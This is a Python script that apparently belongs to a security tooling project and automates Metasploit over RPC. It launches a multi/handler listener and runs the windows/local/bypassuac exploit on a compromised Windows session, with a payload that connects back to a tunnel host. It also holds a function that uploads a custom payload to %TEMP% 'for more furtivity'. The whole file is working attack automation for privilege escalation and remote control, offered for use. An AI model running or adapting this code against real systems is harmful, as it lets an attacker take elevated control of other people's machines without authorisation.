from metasploit.msfrpc import MsfRpcClient
import os
import time
import anssi.settings


def exploit(session_id, session, shell, modules):

    launch_listener(session, modules)

    exploit = modules.use('exploit', 'windows/local/bypassuac')
    exploit.target = 1

    pl = modules.use('payload', session['via_payload'].replace('payload/', ''))
    tunnel = session['tunnel_local'].split(':')
    pl['LPORT'] = tunnel[1]
    pl['LHOST'] = tunnel[0]
    # pl['LHOST'] = '172.21.35.1'

    exploit['SESSION'] = session_id

    # For more furtivity, we could use our own payload
    #exploit['EXE::Custom'] = 'winview.exe'
    #exploit['EXE::Path'] = '%TEMP%'
    #exploit['DisablePayloadHandler'] = True

    exploit.execute(payload=pl)

# Not used for know
# For more furtivity, use our own payload
def upload_payload(shell):
    file_path = os.path.join(anssi.settings.MEDIA_ROOT,
                             'payload', 'winview.exe')
    shell.write('upload "' + file_path + '" %TEMP%')
    ret = shell.read()

    succeed = False
    while not "uploaded" in ret and not "Operation failed" in ret:
        time.sleep(0.1)
        ret = shell.read()

    if "uploaded" in ret:
        succeed = True

    return succeed


def launch_listener(session, modules):
    exploit = modules.use('exploit', 'multi/handler')
    pl = modules.use('payload', session['via_payload'].replace('payload/', ''))
    tunnel = session['tunnel_local'].split(':')
    pl['LPORT'] = tunnel[1]
    pl['LHOST'] = tunnel[0]
    pl['EXITFUNC'] = 'thread'

    exploit.execute(payload=pl)



